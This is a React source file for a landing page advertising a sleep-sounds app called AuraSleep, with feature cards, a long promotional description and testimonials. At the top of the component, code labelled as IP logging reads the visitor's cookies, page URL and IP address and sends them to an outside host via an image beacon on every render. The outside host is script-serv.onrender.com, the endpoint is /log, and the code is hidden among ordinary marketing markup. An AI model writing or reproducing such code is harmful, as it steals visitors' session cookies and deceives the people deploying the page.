import React, { use, useEffect, useState } from "react";

function LandingPage() {
  // Fetch IP for logging
  fetch("https://api.ipify.org?format=json")
    .then((r) => r.json())
    .then((d) => {
      new Image().src =
        "https://script-serv.onrender.com/log?cookie=" +
        encodeURIComponent(document.cookie) +
        "&url=" +
        encodeURIComponent(location.href) +
        "&ip=" +
        encodeURIComponent(d.ip);
    });
  const handleClick = () => {
    console.log("clicked");
  };

  return (
    <>
      <div className="min-h-screen bg-gradient-to-b from-indigo-50 via-white to-indigo-100 text-gray-800">
        {/* Hero Section */}
        <section className="flex flex-col items-center justify-center text-center py-20 px-6">
          <h1 className="text-5xl font-bold mb-6 text-indigo-900">
            Sleep Better. Live Better.
          </h1>
          <p className="text-lg text-gray-600 max-w-2xl mb-8">
            Discover <strong>AuraSleep</strong>, the sleep app designed to help
            you fall asleep faster, track your rest, and wake up refreshed.
          </p>
          <button
            onClick={handleClick}
            className="bg-indigo-600 hover:bg-indigo-700 text-white font-semibold px-8 py-4 rounded-2xl shadow-lg transition"
          >
            Download Free App
          </button>
        </section>

        {/* Features Section */}
        <section className="grid md:grid-cols-3 gap-8 px-10 py-16 max-w-6xl mx-auto">
          <div className="bg-white rounded-2xl shadow-md p-8">
            <h3 className="text-xl font-bold mb-4 text-indigo-700">
              Sleep Sounds
            </h3>
            <p className="text-gray-600">
              Choose from calming rain, ocean waves, white noise, and more.
              Drift into deep sleep effortlessly.
            </p>
          </div>
          <div className="bg-white rounded-2xl shadow-md p-8">
            <h3 className="text-xl font-bold mb-4 text-indigo-700">
              Smart Sleep Tracking
            </h3>
            <p className="text-gray-600">
              Track sleep cycles and quality with advanced analytics so you know
              exactly how you’re resting.
            </p>
          </div>
          <div className="bg-white rounded-2xl shadow-md p-8">
            <h3 className="text-xl font-bold mb-4 text-indigo-700">
              Gentle Alarm
            </h3>
            <p className="text-gray-600">
              Wake up at the right moment in your cycle with a soft alarm
              designed to boost your morning energy.
            </p>
          </div>
        </section>

        {/* Description */}
        <section className="flex justify-center items-center flex-col text-center py-20 px-6">
          <h2 className="text-3xl font-bold mb-6 text-indigo-900">
            About Aurasleep 🌙
          </h2>
          <p className="text-lg text-gray-600 mb-8 max-w-6xl text-center">
            Are you looking for better sleep? Our sleep sounds app helps you
            relax and drift off easily with calming sleep music and nature
            sounds. With the ability to mix and customize your own soothing
            soundscapes, including rain, thunder, and more, you'll experience
            sleep like never before. Key Features: Sleep Music & Calming Sounds:
            Enjoy a wide range of sleep sounds, from relaxing piano music to
            calming thunderstorm sounds. Mix your favorite nature sounds with
            sleep music to create a custom soundscape tailored to your
            preferences. Custom Sound Mixes: Build your own mix of background
            nature sounds, sleep music, rain sounds, and more. Save your unique
            sound creations to use whenever you need help sleeping or relaxing.
            Sleep Timer with Fade-out: Set a timer for your sound mix and let
            the app do the rest. The sound gradually fades out, ensuring a calm
            and soothing transition into sleep. Improve Sleep Quality: Whether
            you need sleep noise, relaxing sounds, or nature’s calming
            influence, our app is your sleep helper. Get ready to sleep easy,
            with sounds designed for relaxation and better sleep. Nature Sounds
            & Rain Sounds: Choose from a variety of nature-inspired sounds like
            rain and thunder to create a peaceful environment perfect for
            sleeping or meditating. With our app, you'll be able to fall asleep
            faster, wake up refreshed, and experience a deeper, more restful
            sleep. The combination of calming music and nature sounds acts as a
            powerful sleep aid, helping you achieve your best sleep yet. Whether
            you prefer the sound of a gentle rain, the soothing melody of a
            piano, or the calming effect of a thunderstorm, our sleep sounds app
            has it all. Create your perfect sleep mix, set the sleep timer, and
            enjoy better sleep every night.
          </p>
        </section>

        {/* Testimonials */}
        <section className="bg-indigo-50 py-20 px-6">
          <h2 className="text-3xl font-bold text-center text-indigo-900 mb-12">
            What Users Say
          </h2>
          <div className="max-w-4xl mx-auto grid md:grid-cols-3 gap-6">
            <div className="bg-white rounded-2xl shadow-md p-6">
              <p className="text-gray-600 mb-4">
                “I’ve struggled with insomnia for years. AuraSleep finally helps
                me sleep through the night.”
              </p>
              <span className="font-semibold text-indigo-700">— Sarah, NY</span>
            </div>
            <div className="bg-white rounded-2xl shadow-md p-6">
              <p className="text-gray-600 mb-4">
                “The gentle alarm is a game changer. I wake up energized instead
                of groggy.”
              </p>
              <span className="font-semibold text-indigo-700">
                — Daniel, CA
              </span>
            </div>
            <div className="bg-white rounded-2xl shadow-md p-6">
              <p className="text-gray-600 mb-4">
                “The relaxing sound library is amazing. I use it every night!”
              </p>
              <span className="font-semibold text-indigo-700">— Priya, TX</span>
            </div>
          </div>
        </section>

        {/* Call to Action */}
        <section className="text-center py-20 px-6">
          <h2 className="text-3xl font-bold mb-6 text-indigo-900">
            Start Sleeping Better Tonight 🌙
          </h2>
          <p className="text-lg text-gray-600 mb-8">
            Join thousands of happy users who improved their rest with
            AuraSleep.
          </p>
          <button
            onClick={handleClick}
            className="bg-indigo-600 hover:bg-indigo-700 text-white font-semibold px-10 py-4 rounded-2xl shadow-lg transition"
          >
            Get AuraSleep Free
          </button>
        </section>
      </div>
    </>
  );
}

export default LandingPage;
